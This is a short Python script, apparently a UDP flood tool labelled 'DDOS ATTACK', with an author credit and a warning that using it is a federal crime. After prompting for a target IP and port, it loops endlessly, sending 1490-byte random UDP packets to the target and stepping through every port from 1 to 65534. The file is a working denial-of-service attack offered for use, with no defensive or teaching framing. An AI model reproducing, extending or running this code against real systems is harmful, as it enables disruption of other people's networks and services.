import os
import time
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
blue_color = "\033[94m"
reset_color = "\033[0m"
green_color = "\033[92m"
red_color = "\033[91m"

os.system("cls" if os.name == "nt" else "clear")

ASCII = """
                                                                                                                                                                                   
 ____________   ____________          ____                 _____                   _____       ________    ________    ________    ________      _____                _____   ______   _______   
 \           \  \           \     ____\_  \__         _____\    \                /      |_    /        \  /        \  /        \  /        \   /      |_         _____\    \_|\     \  \      \  
  \           \  \           \   /     /     \       /    / \    |              /         \  |\         \/         /||\         \/         /| /         \       /     /|     |\\     \  |     /| 
   |    /\     |  |    /\     | /     /\      |     |    |  /___/|             |     /\    \ | \            /\____/ || \            /\____/ ||     /\    \     /     / /____/| \|     |/     //  
   |   |  |    |  |   |  |    ||     |  |     |  ____\    \ |   ||             |    |  |    \|  \______/\   \     | ||  \______/\   \     | ||    |  |    \   |     | |____|/   |     |_____//   
   |    \/     |  |    \/     ||     |  |     | /    /\    \|___|/             |     \/      \\ |      | \   \____|/  \ |      | \   \____|/ |     \/      \  |     |  _____    |     |\     \   
  /           /| /           /||     | /     /||    |/ \    \                  |\      /\     \\|______|  \   \        \|______|  \   \      |\      /\     \ |\     \|\    \  /     /|\|     |  
 /___________/ |/___________/ ||\     \_____/ ||\____\ /____/|                 | \_____\ \_____\        \  \___\                \  \___\     | \_____\ \_____\| \_____\|    | /_____/ |/_____/|  
|           | /|           | / | \_____\   | / | |   ||    | |                 | |     | |     |         \ |   |                 \ |   |     | |     | |     || |     /____/||     | / |    | |  
|___________|/ |___________|/   \ |    |___|/   \|___||____|/                   \|_____|\|_____|          \|___|                  \|___|      \|_____|\|_____| \|_____|    |||_____|/  |____|/   
                                 \|____|                                                                                                                 |____|/                    
"""

DDOS_ATTACK_T = blue_color + ASCII

print(DDOS_ATTACK_T)
print("")
print("author: github.com/codechangerr")
print("USE THIS IF YOU HAVE A REASON TO THIS IS TRACEABLE BY ISP ITS A FEDARAL CRIME YOU WILl BE SENT TO FEDARAL PRISON EVEN IF YOUR UNDERAGE!")
print("if your confused on port use 21 this script will mostlikey do nothing")
print("")

Contintue = input("Continue?")

print("" + reset_color)

os.system("cls" if os.name == "nt" else "clear")

print("" + green_color)

ip = input("IP Target : ")
port = int(input("Port       : "))

os.system("cls" if os.name == "nt" else "clear")

print("" + reset_color)
print("" + red_color)

ASCII2 = """

  /$$$$$$              /$$                 /$$$$$$$                      /$$                       /$$
 /$$__  $$            | $$                | $$__  $$                    | $$                      | $$
| $$  \__/  /$$$$$$  /$$$$$$              | $$  \ $$  /$$$$$$   /$$$$$$$| $$   /$$  /$$$$$$   /$$$$$$$
| $$ /$$$$ /$$__  $$|_  $$_/              | $$$$$$$/ /$$__  $$ /$$_____/| $$  /$$/ /$$__  $$ /$$__  $$
| $$|_  $$| $$$$$$$$  | $$                | $$__  $$| $$$$$$$$| $$      | $$$$$$/ | $$$$$$$$| $$  | $$
| $$  \ $$| $$_____/  | $$ /$$            | $$  \ $$| $$_____/| $$      | $$_  $$ | $$_____/| $$  | $$
|  $$$$$$/|  $$$$$$$  |  $$$$/            | $$  | $$|  $$$$$$$|  $$$$$$$| $$ \  $$|  $$$$$$$|  $$$$$$$
 \______/  \_______/   \___/              |__/  |__/ \_______/ \_______/|__/  \__/ \_______/ \_______/                                                                                                  

"""
print(ASCII2)

time.sleep(2)

sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print("Sent %s packet to %s through port: %s"  % (sent, ip, port))
    if port == 65534:
        port = 1
